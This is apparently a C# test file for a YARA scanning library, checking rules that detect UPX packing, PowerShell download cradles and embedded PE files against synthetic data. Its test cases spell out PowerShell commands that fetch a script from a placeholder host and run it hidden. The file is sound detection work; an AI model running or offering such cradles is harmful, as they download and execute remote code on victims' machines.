using System.Text;

namespace Blazma.Analysis.Tests.Yara;

/// <summary>Rules of the kind people actually write, against synthetic (harmless) data.</summary>
public class YaraRealisticRuleTests
{
    internal const string Upx = """
        rule UPX_Packed : packer
        {
            meta:
                description = "Executable packed with UPX"
                packer = "UPX"
            strings:
                $upx0 = "UPX0" ascii
                $upx1 = "UPX1" ascii
                $magic = "UPX!"
                $stub = { 60 BE ?? ?? ?? ?? 8D BE ?? ?? ?? ?? 57 ( 83 CD FF | 89 E5 ) }
            condition:
                uint16(0) == 0x5A4D and
                uint32(uint32(0x3C)) == 0x00004550 and
                ( ($upx0 and $upx1) or $magic ) and
                $upx0 in (0..1024)
                and #stub >= 0
        }
        """;

    internal const string PowerShellCradle = """
        rule PowerShell_Download_Cradle
        {
            meta:
                description = "PowerShell that downloads and runs code in one line"
            strings:
                $ps = "powershell" nocase ascii wide
                $wc = /new-object\s+(system\.)?net\.webclient/ nocase ascii wide
                $dl1 = ".DownloadString(" nocase ascii wide
                $dl2 = ".DownloadFile(" nocase ascii wide
                $iwr = /\b(iwr|invoke-webrequest)\b/ nocase ascii wide
                $iex = /\b(iex|invoke-expression)\b/ nocase ascii wide
            condition:
                $ps and $iex and ( ($wc and any of ($dl*)) or $iwr )
        }
        """;

    internal const string EmbeddedPe = """
        rule Embedded_PE
        {
            meta:
                description = "A second PE file inside this one"
            strings:
                $mz = "MZ"
            condition:
                for any i in (1..#mz) : (
                    @mz[i] > 0 and
                    uint32(@mz[i] + 0x3C) < 0x1000 and
                    uint32(@mz[i] + uint32(@mz[i] + 0x3C)) == 0x00004550
                )
        }
        """;

    /// <summary>A minimal DOS header pointing at a PE signature, plus padding. Not runnable.</summary>
    internal static byte[] FakePe(int size = 0x400, params (int Offset, string Text)[] extras)
    {
        var pe = new byte[size];
        pe[0] = (byte)'M';
        pe[1] = (byte)'Z';
        BitConverter.GetBytes(0x80).CopyTo(pe, 0x3C);
        Encoding.ASCII.GetBytes("PE\0\0").CopyTo(pe, 0x80);
        foreach (var (offset, text) in extras) Encoding.Latin1.GetBytes(text).CopyTo(pe, offset);
        return pe;
    }

    [Fact]
    public void Upx_rule_matches_upx_section_names_in_a_pe()
    {
        var packed = FakePe(0x400, (0x178, "UPX0"), (0x1A0, "UPX1"));
        var m = Assert.Single(Y.Scan(Upx, packed));
        Assert.Equal("UPX_Packed", m.Rule);
        Assert.Equal(["packer"], m.Tags);
        Assert.Contains(m.Strings, s => s.Identifier == "$upx0" && s.Offset == 0x178 && s.Preview == "UPX0");

        Assert.Empty(Y.Scan(Upx, FakePe(0x400, (0x178, "UPX0")))); // one section name is not enough
        var notPe = FakePe(0x400, (0x178, "UPX0"), (0x1A0, "UPX1"));
        notPe[0] = (byte)'Z';
        Assert.Empty(Y.Scan(Upx, notPe));
    }

    [Fact]
    public void Upx_stub_alternatives_match()
    {
        var stub = new byte[] { 0x60, 0xBE, 1, 2, 3, 4, 0x8D, 0xBE, 5, 6, 7, 8, 0x57, 0x89, 0xE5 };
        Assert.True(Y.Matches("$stub = { 60 BE ?? ?? ?? ?? 8D BE ?? ?? ?? ?? 57 ( 83 CD FF | 89 E5 ) }", "$stub at 3", Y.Cat([0, 0, 0], stub)));
    }

    [Theory]
    [InlineData("powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.test/a')\"", true)]
    [InlineData("PowerShell.exe -w hidden -c iex(iwr http://example.test/p.ps1)", true)]
    [InlineData("POWERSHELL -c \"Invoke-Expression (New-Object System.Net.WebClient).downloadstring('x')\"", true)]
    [InlineData("powershell Get-ChildItem C:\\ | Select-Object Name", false)]
    [InlineData("powershell -c \"(New-Object Net.WebClient).DownloadFile('x','y')\"", false)] // downloads but never runs it
    [InlineData("powershell -c \"$iexplore = 1; iwrx\"", false)] // word boundaries
    public void PowerShell_cradle(string script, bool expected)
    {
        Assert.Equal(expected, Y.Scan(PowerShellCradle, script).Count == 1);
        Assert.Equal(expected, Y.Scan(PowerShellCradle, Y.Wide(script)).Count == 1); // also in UTF-16, as in a .lnk or memory
    }

    [Fact]
    public void Embedded_pe_is_found_after_the_first_byte_only()
    {
        var outer = FakePe(0x400);
        var inner = FakePe(0x200);
        var dropper = Y.Cat(outer, Y.Bytes("....MZ but not a header...."), inner);
        var m = Assert.Single(Y.Scan(EmbeddedPe, dropper));
        Assert.Equal("Embedded_PE", m.Rule);
        Assert.Empty(Y.Scan(EmbeddedPe, outer)); // the file's own header does not count
        Assert.Empty(Y.Scan(EmbeddedPe, Y.Cat(outer, Y.Bytes("MZ"), new byte[0x100])));
    }

    [Fact]
    public void All_three_rules_load_together_and_scan_clean_data_without_matches()
    {
        var set = Y.Rules(Upx + "\n" + PowerShellCradle + "\n" + EmbeddedPe);
        Assert.Equal(3, set.RuleCount);
        Assert.Empty(set.Scan(Y.Bytes("an ordinary text file with nothing in it"), "sample"));
    }
}
